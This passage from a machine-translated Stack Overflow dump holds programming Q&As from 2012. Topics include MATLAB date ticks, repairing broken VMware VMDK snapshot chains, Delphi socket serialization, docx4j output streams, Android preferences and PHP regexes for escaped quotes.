为了`locale.getdefaultlocale()`工作，您显然需要先导入它。

使用我的 ipython shell 运行代码的示例：

```
In [7]: import locale

In [8]: locale.getdefaultlocale()
Out[8]: ('en_US', 'UTF-8') 
```

# matlab - Matlab - datetick，datenum问题

> ID：13360849
> 
> 赞同：2
> 
> 时间：2012-11-13T12:32:51.217
> 
> 标签：matlab

我正在尝试绘制一堆平均为 2 分钟的数据，并且我希望 xaxis 上的标签显示日/月小时：分钟。我可以在 xaxis 上显示一些日期，但有一些问题：

1.  xticks 的位置与我的数据不一致（参见代码片段）
2.  在我的真实数据中，我有 +1000 点，所以我想在特定的时间间隔内进行标记，比如每 12 小时一次。

下面是一个示例。非常欢迎任何帮助。

```
%make date vec
ds = {'28/01/2000 11:52:00';'28/01/2000 11:54:00';'28/01/2000 11:56:00'};
x = datenum(ds,'dd/mm/yyyy HH:MM:SS')

y = [1,2,3]; %data
plot (x,y,'x')

%define start and end date for xAxis
startDate = x(1)
endDate = x(end)
xdata = linspace(startDate,endDate,5)
set(gca,'XTick',xdata)
datetick('x','dd/yy HH:MM') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:49:42.100

将选项添加`keepticks`到`datetick`通话中。在我的 R2012a 上修复了一些问题：

```
datetick('x','dd/yy HH:MM','keepticks') 
```

来源：[this](http://www.mathworks.com/matlabcentral/newsreader/view_thread/309354)和[datetick doc](http://www.mathworks.nl/help/matlab/ref/datetick.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T13:36:40.003

一种解决方案是不要使用`datetick()`自己设置刻度标签。所以用这两行替换你的最后一行代码：

```
 dsdata = datestr(xdata, 'dd/yy HH:MM');
    set(gca,'XTickLabel',dsdata); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-14T11:31:09.833

这对我每分钟都有效

```
 step=2.5/3600;  % minute
    debut = (floor(pts_dthgps(1)/step))*step;
    fin = (floor(pts_dthgps(sz)/step))*step;
    figure(2);
    h=plot(pts_dthgps, pts_vitgps);
    set(gca, 'XTick', [debut:step:fin]);
    datetick('x','HH:MM','keeplimits','keepticks'); 
```

# windows - VM 无法启动 - 机器日志中出现“内容 ID 不匹配”。我怎样才能解决这个问题？

> ID：13360855
> 
> 赞同：0
> 
> 时间：2012-11-13T12:33:06.630
> 
> 标签：windows, vmware, boot, snapshot, corruption

我最近发现，**从 VM 外部**在 VMWare中**挂载虚拟磁盘（`*.VMDK`文件）可能很危险。**

 ****场景描述：** 我创建了一个新的虚拟机（我们称之为**VM B ），我从包含从此类虚拟磁盘读取的***映像工具*（例如*Parted Magic* ）的 ISO 映像引导（属于不同的虚拟机器，名为**VM A** )，以便将内容写入不同的外部物理磁盘。该虚拟磁盘文件仅被挂载，我没有对其结构进行任何更改。

![在此处输入图像描述](../Images/f6bda7b4092001ba73625202eeb00a9f.png)

**问题：** 在我关闭**VM B**并尝试启动另一个**VM A**后，令我惊讶的是它不再启动。查看机器的日志文件 (vmware.log)，我在**VM A的日志中发现***“内容 ID 不匹配”*错误。

 **发生了什么？我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:33:06.630

以下是一些背景信息（所提供的信息对**VMWare Workstation 9**有效。如果您使用的是其他版本，则不能保证它完全适用）：

VMWare 为每个快照创建一个新的 VMDK 文件。在这些文件中，有一个称为磁盘描述符的结构，如下所示：

```
# Disk DescriptorFile
version=1
CID=acd1cf11
parentCID=ffffffff
createType="vmfs" 
```

当访问此类 VMDK 文件时，VMWare 会创建一个新的唯一文件`CID`并将其存储在其中。每个 VMDK 文件都有一个 parentCID，第一个用 标记`ffffffff`，它告诉 VMWare，没有进一步的父存在。每个后续都`parentID`引用一个较早创建的父级，因此它正在以这种方式构建一个**[链表](http://en.wikipedia.org/wiki/Linked_list)**。

我遇到的问题是，如果您将属于不同虚拟机的 VMDK 文件添加到另一个虚拟机，并且**已挂载**，则会创建一个新的 CID，并且[链表](http://en.wikipedia.org/wiki/Linked_list) **可能会中断。**

在这种情况下，此 VMDK 文件所属的虚拟机不再启动，您就会遇到问题。

**例子：**

```
---------- C:\DATA\VMWARE\VMWINDOWS7X64.VMDK
CID=acd1cf11
!OK! parentCID=ffffffff

---------- C:\DATA\VMWARE\VMWINDOWS7X64-000003.VMDK
CID=e54a0beb
!OK! parentCID=627c6ec2

---------- C:\DATA\VMWARE\VMWINDOWS7X64-000002.VMDK
CID=627c6ec2
?NOTFOUND? parentCID=b43e1a6f

---------- C:\DATA\VMWARE\VMWINDOWS7X64-000006.VMDK
CID=0454e2f0
!OK! parentCID=8f139197

---------- C:\DATA\VMWARE\VMWINDOWS7X64-000001.VMDK
CID=92718e8b
?NOTFOUND? parentCID=ad44b86e

[...] 
```

你可以看到，我在哪里添加了**！OK！**在 parentCID 行中，存在具有有效 CID 的父 VMDK。但在完整的真实案例中，总共找不到 2 个（在此示例中标记为**？NOTFOUND？ ）。**VMWare 上有[一篇文章描述了这个问题（](http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&cmd=displayKC&externalId=1007969) *“父虚拟磁盘已在子虚拟磁盘创建后被修改”错误 (1007969)*）。我曾尝试挂载较早版本的 VMDK 文件，但没有成功，因为链中的第一个文件 VMWINDOWS7X64.VMDK 不再被任何其他文件引用。

使用文本编辑器按照上面提到的 VMWare 文章的建议编辑这些文件不是一种选择，因为

1.  我不会用文本编辑器触摸二进制文件
2.  我还没有找到可以在 Windows 中处理如此大文件的编辑器。

我在 Stackoverflow 中看到一些文章要求在 C# 中查找和替换代码，但还没有找到令人满意的答案。然后我找到了一个可以为 Windows 处理大型二进制文件的十六进制编辑器，它的名字是[HxD](http://mh-nexus.de/en/hxd/)。它可免费用于商业和非商业用途。

使用此编辑器，您可以找到上述问题中提到的结构，修补 CID 并修复损坏的链，例如：

![VMDK示例](../Images/a175b4e47767bfc091cc0e45ce666106.png)

**行动：**

*   **备份整个虚拟机。在副本上工作。**
*   使用之前创建的 CID 和父 CID 列表（如问题中所示）
*   更新它，以便每个 parentCID 指向适当的 CID（快照文件的编号可能在这里有所帮助，但在我的情况下，我发现快照编号并不总是升序。`parentFilenameHint`如果顺序，首先将包含在 VMDK 文件中仍然不清楚在资源管理器中按日期时间降序对 VMDK 文件进行排序 - 最旧的是根文件（`parentCID=ffffffff`）。事实证明，这几乎是您查看CID[链表时得到的顺序）。](http://en.wikipedia.org/wiki/Linked_list)
*   使用编辑器修补每个 VMDK 文件，但只修补那些不适合的 CID/parentCID
*   尝试启动虚拟机。如果它成功了，你很幸运并且已经修复了它。如果它没有启动，请移除虚拟磁盘并尝试使用链中的另一个磁盘。就我而言，经过一些尝试，它接受了文件`VMWINDOWS7X64-000003.VMDK`并正确启动。这意味着并非所有快照都已恢复，但机器又可以正常工作了。另请参阅下面的注释，我终于能够完全修复它。

最终起作用的修复是（用 标记的更改`!FIX!`）：

```
---------- C:\DATA\VMWARE\VMWINDOWS7X64-000003.VMDK
CID=e54a0beb
!OK! parentCID=627c6ec2

---------- C:\DATA\VMWARE\VMWINDOWS7X64-000002.VMDK

CID=627c6ec2
!FIX! parentCID=92718e8b

---------- C:\DATA\VMWARE\VMWINDOWS7X64-000001.VMDK
CID=92718e8b
!FIX! parentCID=acd1cf11

---------- C:\DATA\VMWARE\VMWINDOWS7X64.VMDK
CID=acd1cf11
!OK! parentCID=ffffffff 
```

**笔记：**

*   无法保证修补 CID 会使 VM 恢复工作状态。
*   该方案假定您尚未写入快照所依赖的 VMDK。
*   可能是您找到了几种方法来恢复 CID 的链接列表 - 将它们全部写下来然后尝试它们（记住：您有备份！），如果您幸运的话，您找到了正确的，然后您就可以完全恢复一切。就我而言，有两种可能的方法来重新创建链接列表。一个让我部分恢复，另一个最终恢复了问题发生之前的一切。
*   我建议**在成功修复后，**您应该在新目录中从虚拟机**的当前状态创建完整克隆。**这为您提供了干净、一致的文件。****

# delphi - 通过套接字交换数据

> ID：13360857
> 
> 赞同：2
> 
> 时间：2012-11-13T12:33:16.710
> 
> 标签：delphi, sockets, winsock, delphi-xe

当我向客户端发送一个字符串（tkString）时，客户端在尝试重建 TValue 时告诉我（在 WMClientRecv 内部）访问冲突，为什么？-_-" 与其他类型的数据一起工作得很好......

例如，整数 (tkEnum)

这是服务器代码（将调用数据发送到客户端）

```
procedure TServerClass.InvokeMethod(const InvokableMethod: TInvokeableMethod; const MethodArg: TValue);
var
  InvokeRec : packed record
    Method: Array[0..19] of Char;
    ArgRawSize: Integer;
    ArgTypeInf: TTypeInfo;
    ArgRawData: Array[0..255] of Byte; 
  end;
begin
  // copy method name to record
  lstrcpy(InvokeRec.Method, PChar(InvokableMethod));

  // copy arg array to record
  InvokeRec.ArgRawSize := MethodArg.DataSize;

  if (MethodArg.DataSize <> 0) then
  begin
    MethodArg.ExtractRawData(PByte(@InvokeRec.ArgRawData[0]));

    InvokeRec.ArgTypeInf := MethodArg.TypeInfo^;
  end; 

  // send record
  ServerSocket.Socket.Connections[idxSocket].SendBuf(PByte(@InvokeRec)^, SizeOf(InvokeRec));
end; 
```

客户将其读取为：

```
procedure TClientClass.ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
var
  Buffer: PByte;
  BufLen: Integer;

  InvokeRec: TInvokeRec;
begin
  BufLen := Socket.ReceiveLength;

  Memo1.Lines.Append(Format('%d: Received %d bytes', [Memo1.Lines.Count, BufLen]));

  // dump keep-alive from recv buffer
  if (BufLen = 64) then
  begin
    GetMem(Buffer, BufLen);
    try
      Socket.ReceiveBuf(Buffer^, BufLen);
    finally
      FreeMem(Buffer, BufLen);
    end;
    Exit;
  end;

  Socket.ReceiveBuf(PByte(@InvokeRec)^, BufLen);
  SendMessage(Handle, WM_ClientRecv, 0, LPARAM(@InvokeRec));
end; 
```

WMClientRecv 的例程：

```
procedure TClientClass.WMClientRecv(var Msg: TMessage);
var
  // we send to server
  ReadRec: TSharedRec;

  // we recv from server
  InvokeRecPtr: PInvokeRec;

  Value: TValue;
begin
  InvokeRecPtr := PInvokeRec(Msg.LParam);

  case InvokeRecPtr.ArgRawSize of
  0:
    Value.Empty;
  else
    TValue.Make(PByte(@InvokeRecPtr.ArgRawData)^, PTypeInfo(@InvokeRecPtr.ArgTypeInf), Value);
  end;

  InvokableSubclass.ExecMethod(InvokeRecPtr.Method, Value);
end; 
```

和ExceMethod：

```
procedure TInvokableSubclass.ExecMethod(const vmName: string; const Arg0: TValue);
var
  LContext: TRttiContext;
begin
  //
  FSendMode := TextMode;

  //
  if (Arg0.DataSize = 0) then
  begin
    LContext.GetType(TInvokableSubclass).GetMethod(vmName).Invoke(Self, []);
    Exit;
  end;

  LContext.GetType(TInvokableSubclass).GetMethod(vmName).Invoke(Self, Arg0);
end; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T14:16:22.763

您正在尝试序列化类型的变量`TTypeInfo`。看看它的声明：

```
TTypeInfo = record
  Kind: TTypeKind;
  Name: ShortString;
 {TypeData: TTypeData}
end; 
```

您的代码将序列化前两个字段，但无法序列化作为实现细节的一部分的隐藏字段。这是一种比较特殊的类型。您不能简单地将一个`TTypeInfo`变量分配给另一个变量。你的意思是传递`PTypeInfo`变量。

事实上，考虑发送类型信息的代码：

```
InvokeRec.ArgTypeInf := MethodArg.TypeInfo^; 
```

这段代码已经被破坏了，因为它正在分配给 a `TTypeInfo`，正如我上面所说的，这不能通过简单的分配来完成。

现在，您显然不能简单地序列化 a `PTypeInfo`，因为它只在拥有它的进程的地址空间中有意义。而且您不能轻易调用`GetTypeData()`和序列化`PTypeData`返回的内容。这是一个复杂的结构，其中还包含难以序列化的指针。

我怀疑最简单的方法是推出您自己的类型信息序列化机制。也许发送类型的名称然后让接收者使用该名称查找它就足够了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T19:17:43.397

正如我刚刚对您的[另一个问题](https://stackoverflow.com/questions/13261486)发表的评论一样，`TTypeInfo`它是可变长度并包含指向其他数据的指针，因此您不能按原样传输它并让它在接收端有意义。您将必须传输`TValue.TypeInfo.Name`字符串，然后您可以`TRttiContext.FindType(Name).Handle`在接收端使用以获取适当`TTypeInfo`的传递给`TValue.Make()`.

# c# - 具有强类型表和动态表名的 EntityFramework Code First

> ID：13360860
> 
> 赞同：0
> 
> 时间：2012-11-13T12:33:33.043
> 
> 标签：c#, entity-framework, ef-code-first, dynamic-tables

我正在尝试创建一个应用程序，该应用程序在运行时创建具有相同结构但表名不同的表。

不同的工作会收集数据，每个工作都应该有自己的表，因为每个工作都会收集超过 1000 万个条目，我不想将它们存储在一个表中。每个作业的存储条目类型相同，但每个表都应以作业名称命名。

最后我不会做这样的事情：

```
JobResultType result001 = context.Table("JobResults001").Where(...); 
List<JobResultType> results002 = context.Table("JobResults002").Where(...).ToList();
... 
```

我已经尝试了 EntityFramework Code First 和 Linq2SQL，但没有得到有效的解决方案。

有没有人知道这个问题的轻量级和干净的解决方案？

该解决方案应该适用于 SQL Server 和 MySql ;-)

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:06:22.847

在 EF 中，您可以使用流畅的映射来控制数据来自的表名：

```
modelBuilder.Entity<JobResultsType>()
    .ToTable("JobResults0001"); 
```

那么，也许您可​​以创建不同的上下文或为不同的作业重新运行流畅的映射？所以一个工作进来了，然后你创建一个新的上下文，使用新的表名映射到......我认为这*应该*工作......

# java - Java 将本地时间转换为无 DST 时间 - 切换时间连续

> ID：13360863
> 
> 赞同：0
> 
> 时间：2012-11-13T12:33:39.387
> 
> 标签：java, date, timezone, gregorian-calendar

我们有一个问题，我们正在接收一个在本地时间定义的时间对象 - 使用 DST。现在我们将接收时间作为无 DST 时区存储在数据库中。一年一次，我们有一个小时的转换不正确：在凌晨 2:00，时钟将在传入的 DST 时区设置为凌晨 1:00（将时间切换到冬季时间）。我们将其更正为当地时间凌晨 2 点（即格林威治标准时间）。凌晨 2 点 15 分，我们收到一个数据包，我们再次将其更正为 2 点 15 分。但现在它真的是 2:15 而不是 1:15。原则上，我们现在在系统中的时间增加了一倍。java gregorian calendar 无法在时区之间转换，并考虑当前本地时间（以确定它是否必须考虑双倍小时）。

这是我将传入 DST 时区转换为非 DST 时区的代码：

```
public static GregorianCalendar getCal(XMLGregorianCalendar c)
{

    GregorianCalendar toGregorianCalendar = c.toGregorianCalendar();
    TimeZone tz = TimeZone.getTimeZone("GMT+1");

    toGregorianCalendar.setTimeZone(tz);
    toGregorianCalendar.setTimeZone(TimeZone.getTimeZone("Europe/Berlin"));

    return toGregorianCalendar;
} 
```

这似乎全年都可以正常工作 - 除了唯一一个小时切换回冬季时间......关于这个心灵弯曲问题的任何想法？

# android - onPreferenceClick 在android中不起作用

> ID：13360865
> 
> 赞同：1
> 
> 时间：2012-11-13T12:33:49.730
> 
> 标签：android

我在实施首选项时遇到问题。当我运行我的应用程序并单击首选项选项卡时，没有任何反应。我不知道代码有什么问题，因为 logcat 不显示任何内容。并提前感谢。

```
public class Reset extends PreferenceActivity{

private Preference myPreference;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    myPreference = findPreference("reset");
    myPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {

        public boolean onPreferenceClick(Preference arg0) {
            Builder alertDialog = new AlertDialog.Builder(Reset.this);
            alertDialog.setMessage("Reset?");
            alertDialog.setCancelable(true);
            alertDialog.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    SharedPreferences settings =  PreferenceManager.getDefaultSharedPreferences(getBaseContext());                          
                    SharedPreferences.Editor editor = settings.edit();
                    editor.clear();
                    editor.commit();
                } }); 
            alertDialog.setNegativeButton("No", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.cancel();
                } }); 
            alertDialog.show();
            return false;
        }
    });

}

} 
```

XML:

```
 <?xml version="1.0" encoding="utf-8"?>
 <PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android" >
 <Preference android:title="Reset Score" android:key="reset">
 </Preference>
 </PreferenceScreen> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T13:49:10.003

将此行添加到您的代码中：

```
addPreferencesFromResource(R.xml.preferences); 
```

此代码有效：

```
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.Preference;
import android.preference.Preference.OnPreferenceClickListener;
import android.preference.PreferenceActivity;
import android.preference.PreferenceManager;

public class Reset extends PreferenceActivity{

private Preference myPreference;

@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
addPreferencesFromResource(R.xml.preferences);
myPreference = findPreference("reset");
myPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
    public boolean onPreferenceClick(Preference arg0) {
        Builder alertDialog = new AlertDialog.Builder(Reset.this);
        alertDialog.setMessage("Reset?");
        alertDialog.setCancelable(true);
        alertDialog.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                SharedPreferences settings =   PreferenceManager.getDefaultSharedPreferences(getBaseContext());                          
                SharedPreferences.Editor editor = settings.edit();
                editor.clear();
                editor.commit();
            } }); 
        alertDialog.setNegativeButton("No", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            } }); 
        alertDialog.show();
        return false;
    }
});

}

} 
```

并记得添加您的活动：重置到清单：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T13:35:14.873

您缺少的关键线是

```
addPreferencesFromResource(R.xml.preferences); 
```

一旦你添加了一切都应该工作。

```
public class Reset extends PreferenceActivity {

    private Preference myPreference;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        addPreferencesFromResource(R.xml.preferences);
        myPreference = findPreference("reset");
        myPreference.setOnPreferenceClickListener(new OnPreferenceClickListener() {

            public boolean onPreferenceClick(Preference arg0) {
                Builder alertDialog = new AlertDialog.Builder(Reset.this);
                alertDialog.setMessage("Reset?");
                alertDialog.setCancelable(true);
                alertDialog.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
                        SharedPreferences.Editor editor = settings.edit();
                        editor.clear();
                        editor.commit();
                    }
                });
                alertDialog.setNegativeButton("No", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.cancel();
                    }
                });
                alertDialog.show();
                return false;
            }
        });

    }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:38:25.600

使用 .equals 而不是 == 来比较对象。

```
if (preference.equals(myPrefernce)){

...

} 
```

# python - EOFError Python 2.7 到 3 迁移

> ID：13360866
> 
> 赞同：1
> 
> 时间：2012-11-13T12:33:50.493
> 
> 标签：python, python-3.x, python-2.7, pickle

> **可能重复：**
> [builtins.TypeError：必须是 str，而不是字节](https://stackoverflow.com/questions/5512811/builtins-typeerror-must-be-str-not-bytes)

我编写了一个程序来将字典写入文件，在 Python 2.7 中它运行良好，但现在在 Python 3 中我收到`TypeError: 'str' does not support the buffer interface`并`TypeError: must be str, not bytes`

**代码更新**

**输入**：目录路径、文件名（`!hamers.txt`例如）和新字典

**输出**：无

**效果**：用字典生成新文件。检查文件是否存在，然后合并两个字典（现有的和新的）。

```
def generate_file_from_dict(self, path, fname, my_new_dict):                   
                    mfile = self.add_slash(path)+fname
            if os.path.exists(mfile):
                    mfile = open(mfile, 'rb')
                    my_existing_dict = pickle.load(mfile)
                    my_new_dict = dict(my_existing_dict.items() + my_new_dict.items())
                    mfile.close()
            mfile = open(self.add_slash(path)+fname, 'wb+')
            pickle.dump(my_new_dict, mfile)
            mfile.close() 
```

**现在它的**

```
my_existing_dict = pickle.load(mfile)
EOFError 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:47:27.373

该文件应该以二进制打开

```
mfile = open(mfile,'rb')

mfile = open(self.add_slash(path)+fname, 'wb+') 
```

# java - 将 WordprocessingMLPackage 保存到 ByteArrayInputStream

> ID：13360867
> 
> 赞同：5
> 
> 时间：2012-11-13T12:33:56.507
> 
> 标签：java, openxml, docx, docx4j

如何将 org.docx4j.openpackaging.packages.WordprocessingMLPackage 实例保存到 ByteArrayInputStream 中，然后可以从服务器下载。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-05T23:33:11.913

我遇到了同样的问题，并找到了一种更简单的方法，无需更改 save() 函数。来源[here](http://www.docx4java.org/forums/docx-java-f6/urgent-output-stream-rendering-to-browser-t320.html)，我做了一些编辑：

对于 WordMLPackage p 和 HttpServletResponse 响应：

```
response.setContentType("application/vnd.openxmlformats-officedocument.wordprocessingml.document");
String fileName = "MyDocument.docx";
response.setHeader("Content-disposition", "attachment;filename=${fileName}");
SaveToZipFile saver = new SaveToZipFile(p);
saver.save( response.getOutputStream() ); 
```

进口声明：

```
import org.docx4j.openpackaging.io.* 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T12:40:46.937

你不能保存到`ByteArrayInputStream`...永远。A`ByteArrayInputStream`是一个`InputStream`，你不/不能写一个`InputStream`。

但是，您可以向 a 写入一些内容`ByteArrayOutputStream`，获取字节数组，并`ByteArrayInputStream`为该数组创建一个包装器。

（我假设有一种方法可以将其中一个实例保存到 OutputStream 或 Writer ...）

* * *

好吧，我的假设是错误`WordprocessingMLPackage`的，唯一的`save`方法是保存到`File`. （我猜有人没有得到关于如何设计灵活 I/O api 的备忘录……）

但是源代码（[这里](http://www.jarvana.com/jarvana/view/org/docx4j/docx4j/2.7.1/docx4j-2.7.1-sources.jar!/org/docx4j/openpackaging/packages/WordprocessingMLPackage.java?format=ok)）提供了一些关于如何自己实现它的线索。方法如下：

```
public void save(java.io.File docxFile) throws Docx4JException {

    if (docxFile.getName().endsWith(".xml")) {

        // Create a org.docx4j.wml.Package object
        FlatOpcXmlCreator worker = new FlatOpcXmlCreator(this);
        org.docx4j.xmlPackage.Package pkg = worker.get();

        // Now marshall it
        JAXBContext jc = Context.jcXmlPackage;
        try {
            Marshaller marshaller=jc.createMarshaller();

            marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT,
                                                   Boolean.TRUE);
            NamespacePrefixMapperUtils.setProperty(marshaller, 
                    NamespacePrefixMapperUtils.getPrefixMapper());          

            marshaller.marshal(pkg, new FileOutputStream(docxFile));
        } catch (Exception e) {
            throw new Docx4JException("Error saving Flat OPC XML", e);
        }   
        return;
    }

    SaveToZipFile saver = new SaveToZipFile(this); 
    saver.save(docxFile);
} 
```

看起来您应该能够在帮助程序类中复制此代码，并对其进行调整以保存到 a`OutputStream`而不是（特别是） a `FileOutputStream`。请注意，`SaveToZipFile`该类具有`save`写入到`OutputStream`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-07-29T16:57:36.367

从 3.1.0 版本开始，您可以使用`save(OutputStream outStream)`：

```
/**
     *  Save this pkg to an OutputStream in the usual zipped up format
     *  (Docx4J.FLAG_SAVE_ZIP_FILE)
     *  
     *  @since 3.1.0
     */ 
    public void save(OutputStream outStream) throws Docx4JException {
        save(outStream, Docx4J.FLAG_SAVE_ZIP_FILE);                     
    } 
```

# c# - 如何使用正则表达式提取标签链接（REGEX - C#）

> ID：13360868
> 
> 赞同：0
> 
> 时间：2012-11-13T12:34:01.640
> 
> 标签：c#, regex

到目前为止，我有这个：

```
<a href="(http://www.imdb.com/title/tt\d{7}/)".*?>.*?</a> 
```

C＃

```
ArrayList imdbUrls = matchAll(@"<a href=""(http://www.imdb.com/title/tt\d{7}/)"".*?>.*?</a>", html);
private ArrayList matchAll(string regex, string html, int i = 0)
{
  ArrayList list = new ArrayList();
  foreach (Match m in new Regex(regex, RegexOptions.Multiline).Matches(html))
    list.Add(m.Groups[i].Value.Trim());
  return list;
} 
```

我正在尝试从 HTML 页面中提取 imdb 链接这个正则表达式有什么问题？

这样做的主要思想是在谷歌中搜索一部电影，然后在结果中寻找指向 imdb 的链接

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:03:46.210

正则表达式不是解析 HTML 文件的好选择。HTML 并不严格，其格式也不规则。

使用[htmlagilitypack](http://htmlagilitypack.codeplex.com/)。您可以使用此代码来检索它`HtmlAgilityPack`

```
HtmlDocument doc = new HtmlDocument();
doc.Load(yourStream);

List<string> anchorImdbList = doc.DocumentNode.SelectNodes("//a[@href]")//this xpath selects all anchor tags
                  .Select(p => p.Attributes["href"].Value)
                  .Where(x=>Regex.IsMatch(x,@".*?www\.imdb\.com.*?"))
                  .Select(y=>y)
                  .ToList<string>(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:57:12.780

您必须转义正斜杠。尝试：

```
<a href="(http:\/\/www.imdb.com\/title\/tt\d{7}\/)".*?>.*?<\/a> 
```

如果需要从复杂页面中解析出 html 元素，正则表达式会非常麻烦。按照其他人的建议尝试[Html Agility Pack 。](http://htmlagilitypack.codeplex.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:50:22.953

尝试这个 ：

```
string tag = "tag of the link";
string emptystring = Regex.Replace(tag, "<.*?>", string.Empty); 
```

更新 ：

```
string emptystring = Regex.Replace(tag, @"<[^>]*>", string.Empty); 
```

# html - IE8 + pie.htc：添加 html5shiv.js 再次破坏圆角

> ID：13360869
> 
> 赞同：4
> 
> 时间：2012-11-13T12:34:03.523
> 
> 标签：html, internet-explorer-8, rounded-corners, css3pie, html5shiv

好的，在任何其他浏览器中一切正常，除了 IE8。我已经连接了 pie.htc 来解决 IE8 的圆角问题。一切正常。然后我发现 IE8 的 html5 存在一些问题。这就是我使用 html5shiv.js 的原因。现在一切都很好，但是一些圆角又变成了方形。它只发生在一个div内。

使用 pie.htc + html5shiv.js 在 IE8 中，所有其余的圆角仍然看起来不错。我的意思是 html5shiv.js 并没有破坏它们。

我试图解决那个角落的问题，但没有运气：我搬家了

```
<!--[if lt IE 9]>
<script src="path/to/html5shiv.js"></script>
<![endif]--> 
```

在 css 加载之前启动。另外，我放 !important 只是为了确保 .superclass{ 行为：url(/PIE.htc); 位置：相对！重要；用于修复该超类的 IE8 圆角。

此外，我尝试使用以下 3 个字符串的大多数组合进行添加：

```
 z-index: 1;
  *position:relative!important;
  *z-index: 1; 
```

但没有任何帮助。还能做什么？一旦我删除

```
<!--[if lt IE 9]>
<script src="path/to/html5shiv.js"></script>
<![endif]--> 
```

角落再次变圆。有任何想法吗？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-07T17:10:59.117

使用条件注释和[HTML/CSS 解决方案](https://stackoverflow.com/questions/1029954/how-to-make-round-corner-layout-by-pure-css-and-html/1039114#1039114)来创建圆角：

```
 <div class="container">
   <b class="rtop">
      <b class="r1"></b>
      <b class="r2"></b>
      <b class="r3"></b>
      <b class="r4"></b>
   </b>
     CONTENTS GOES HERE
   <b class="rbottom">
     <b class="r4"></b>
     <b class="r3"></b>
     <b class="r2"></b>
     <b class="r1"></b>
   </b>
 </div> 
```

**参考：**

*   [使用 CSS 和无图像的圆角](http://webdesign.about.com/od/css/a/aa072406.htm)
*   [粗边框](http://www.cssplay.co.uk/boxes/chunky.html)

# php - 如何调整我的正则表达式以允许转义引号？

> ID：13360870
> 
> 赞同：2
> 
> 时间：2012-11-13T12:34:05.040
> 
> 标签：php, regex, preg-replace, preg-match, preg-split

## 介绍

首先，我的一般问题是我想用字符串替换字符串中的问号，但前提是它们*没有*被引用。[所以我在 SO (链接](https://stackoverflow.com/a/10929115/461813))上找到了一个类似的答案，并开始测试代码。不幸的是，当然，代码没有考虑转义引号。

例如：`$string = 'hello="is it me your are looking for\\"?" AND test=?';`

[我已经从该问题的答案](https://stackoverflow.com/a/10929115/461813)中改编了一个正则表达式和代码：[如何替换双引号和单引号之外的单词](https://stackoverflow.com/questions/10928935/how-to-replace-words-outside-double-and-single-quotes/10929115)，为了便于阅读我的问题，在此复制：

```
<?php
function str_replace_outside_quotes($replace,$with,$string){
    $result = "";
    $outside = preg_split('/("[^"]*"|\'[^\']*\')/',$string,-1,PREG_SPLIT_DELIM_CAPTURE);
    while ($outside)
        $result .= str_replace($replace,$with,array_shift($outside)).array_shift($outside);
    return $result;
}
?> 
```

## 实际问题

所以我试图调整模式以允许它匹配任何不是引号`"`和转义的引号`\"`：

```
<?php
$pattern = '/("(\\"|[^"])*"' . '|' . "'[^']*')/";

// when parsed/echoed by PHP the pattern evaluates to
// /("(\"|[^"])*"|'[^']*')/
?> 
```

但这并不像我希望的那样工作。

我的测试字符串是：`hello="is it me your are looking for\"?" AND test=?`

我得到以下比赛：

```
array
  0 => string 'hello=' (length=6)
  1 => string '"is it me your are looking for\"?"' (length=34)
  2 => string '?' (length=1)
  3 => string ' AND test=?' (length=11) 
```

匹配索引二不应该存在。该问号应仅被视为匹配索引 1 的一部分，而不应单独重复。

一旦解决了这个相同的修复也应该更正单引号/撇号的主要交替的另一侧`'`。

在由完整函数解析后，它应该输出：

```
echo str_replace_outside_quotes('?', '%s', 'hello="is it me your are looking for\\"?" AND test=?');
// hello="is it me your are looking for\"?" AND test=%s 
```

我希望这是有道理的，并且我已经提供了足够的信息来回答这个问题。如果没有，我会很乐意提供您需要的任何东西。

## 调试代码

我当前（完整）的代码示例[也在用于分叉的键盘上](http://codepad.org/6dpepn2r)：

```
function str_replace_outside_quotes($replace, $with, $string){
    $result = '';
    var_dump($string);
    $pattern = '/("(\\"|[^"])*"' . '|' . "'[^']*')/";
    var_dump($pattern);
